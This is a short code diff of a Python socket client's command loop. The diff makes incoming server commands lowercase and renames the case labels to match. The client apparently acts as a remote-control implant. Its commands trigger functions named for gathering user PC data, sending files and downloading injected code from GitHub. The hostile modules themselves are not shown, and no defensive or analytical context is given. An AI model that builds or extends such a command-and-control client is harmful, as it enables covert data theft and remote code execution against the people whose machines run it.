@@ -40,7 +40,7 @@ def start_client():
                 with conn:
                     while True:
                         try:
-                            data = conn.recv(64).decode("utf-8") 
+                            data = conn.recv(64).decode("utf-8").lower()
                         except: 
                             print("Server disconnected attempting reconnection.")
                             time.sleep(0.01) #? maybe fixes the issue?
@@ -64,12 +64,12 @@ def start_client():
                                     userscanner.start_sendFiles(data)
                                     data = ""
                                     
-                                case "run -gatherData":
+                                case "run -gatherdata":
                                     getuser_pc.startGathering()
                                     print("Gathering Data")
                                     data= ""
 
-                                case "run -injectCode":
+                                case "run -injectcode":
                                     github_inject.start_downloading()
                                     print("Injecting code")
                                     data = ""
